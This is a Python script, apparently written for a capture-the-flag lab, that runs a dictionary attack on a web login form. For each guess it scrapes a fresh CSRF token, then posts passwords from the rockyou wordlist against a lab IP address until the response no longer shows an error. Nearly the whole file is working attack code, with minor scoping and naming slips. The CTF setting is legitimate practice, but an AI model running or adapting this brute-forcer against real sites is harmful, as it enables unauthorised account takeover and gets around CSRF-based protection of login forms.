""" A functional dictionary-based fuzzer put together for to crack 'Gemini v1' CTF challenge

    This module demostrates a method of attacking forms protected by CSRF token.
    Example:
        $ python3 brute_with_csrf.py 

    Todo: 
        * Pass variables via command line options
        * Support multi-threading
        * Add better error handling
"""

import requests
from bs4 import BeautifulSoup

# This should be probably passed via command options
url = "http://192.168.56.105/test2/login.php"
data = {
        "name" : "admin",
        "password": "mypass"
        }
fuzz = "/usr/share/wordlists/rockyou.txt"

line = "======================================================"

### Do not edit below ###
def get_csrf_token(raw_response, csrf_token):
    """ Retrieve and return CSRF token 
    Params:
        * raw_response: response from requests.get(url) call (raw text)
        * csrf_token: name of the form item containing CSRF token
        
    Returns:
        * string representation of CSRF token """
    soup = BeautifulSoup(client.get(url).text, "html.parser")
    return soup.find('input', {'name': csrf_token}).get('value')
try:
    print(line)
    print("[*] Loading " + fuzz)
    fuzz_file = open(fuzz, encoding='latin-1')
    print("[*] Done!")
    print(line)
except Exception as e:
    print(e)

def fuzz():
    """ Perform dictionary attack """
    for f in fuzz_file.readlines():
        pwd = f.strip("\n")
        try:
            # Ideally this should run in multiple threads.
            with requests.session() as client:
                headers = {'User-Agent' : 'Mozilla/5.0'}
                response_pre = client.get(url).text
                data['token'] = get_csrf_token(response_pre, 'token')
                data['password'] = pwd
                response_post = client.post(url, data=data)
                # we need to check if response contains an error complaining about incorrect password or CSRF token
                # note this varies from app to app.
                if "alert" in response_post.text:
                    print("[*] CSRF: '%s' User: '%s' Pass: '%s'" % (data['token'], data['name'], data['password']))
                else: 
                    print(line)
                    print("[*] -- -- FOUND -- --")
                    print("[*] User: '%s' Pass: '%s'" % (data['name'], data['password']))
                    print(line)
                    break
        except Exception as e:
            print(e)
            pass

if __name__ == "__main__":        
    fuzz()
    fuzz_file.close()    
